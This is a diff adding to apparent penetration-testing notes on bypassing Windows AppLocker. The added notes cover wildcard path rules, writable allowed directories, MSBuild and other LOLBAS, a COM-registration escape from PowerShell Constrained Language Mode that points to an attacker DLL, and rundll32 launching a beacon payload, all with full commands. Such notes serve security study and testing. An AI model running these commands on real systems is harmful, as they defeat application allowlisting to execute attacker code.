@@ -26,7 +26,42 @@ enumeration of policies
             PS C:\Users\Attacker> Parse-PolFile -Path .\Desktop\Registry.pol
 
 bypassing policies
-    
+    path wildcards
+        there may be custom rules that allow execution from a specified directory but used overpermissive wildcards
+            e.g. 	<FilePathCondition Path="*\App-V\*"/>
+                    this now allows any executable to run in any directory named App-V
+    writeable directories
+        there are several directories that exist within the default allowed path for many of the rules
+        simply drop the executable in here and it will be allowed to run
+            example directories:
+                C:\Windows\Tasks
+                C:\Windows\Temp 
+                C:\windows\tracing
+                C:\Windows\System32\spool\PRINTERS
+                C:\Windows\System32\spool\SERVERS
+                C:\Windows\System32\spool\drivers\color
+    LOLBAS (https://lolbas-project.github.io/)
+        some LOLBAS that are able to execute arbitrary code exist in an allowlisted space such as %WINDIR%\*
+        MSBuild allows us to execute arbitrary C# code from a .csproj file (example in msbuild_LOLBAS.csproj)
+    powershell CLM
+        applocker will change powershell language mode from FUllLanguage to ConstrainedLanguage
+        verify this
+            PS C:\Users\pchilds> $ExecutionContext.SessionState.LanguageMode
+        however we can still use New-Object to load COM objects such as WScript.Shell
+        using this we can create a new COM object that will load an arbitrary DLL
+            PS C:\Users\pchilds> New-Object -ComObject WScript.Shell
+            PS C:\Users\pchilds> [System.Guid]::NewGuid()
+            C:\Users\pchilds> New-Item -Path 'HKCU:Software\Classes\CLSID' -Name '{6136e053-47cb-4fdd-84b1-381bc5f3edb3}'
+            C:\Users\pchilds> New-Item -Path 'HKCU:Software\Classes\CLSID\{6136e053-47cb-4fdd-84b1-381bc5f3edb3}' -Name 'InprocServer32' -Value 'C:\Users\pchilds\Desktop\bypass.dll'
+            C:\Users\pchilds> New-ItemProperty -Path 'HKCU:Software\Classes\CLSID\{6136e053-47cb-4fdd-84b1-381bc5f3edb3}\InprocServer32' -Name 'ThreadingModel' -Value 'Both'
+
+C:\Users\pchilds> New-Item -Path 'HKCU:Software\Classes' -Name 'AppLocker.Bypass' -Value 'AppLocker Bypass'
+C:\Users\pchilds> New-Item -Path 'HKCU:Software\Classes\AppLocker.Bypass' -Name 'CLSID' -Value '{6136e053-47cb-4fdd-84b1-381bc5f3edb3}'
+    rundll32
+        DLL rules are rarely enabled due to performance concerns
+        so we can use rundll32 to load arbitrary DLLs
+            e.g. C:\Users\pchilds\Desktop> rundll32 bypass.dll,execute 
+                NOTE: the beacon DLL payload is specficially crafted to be called from rundll32
 
 *********************
 
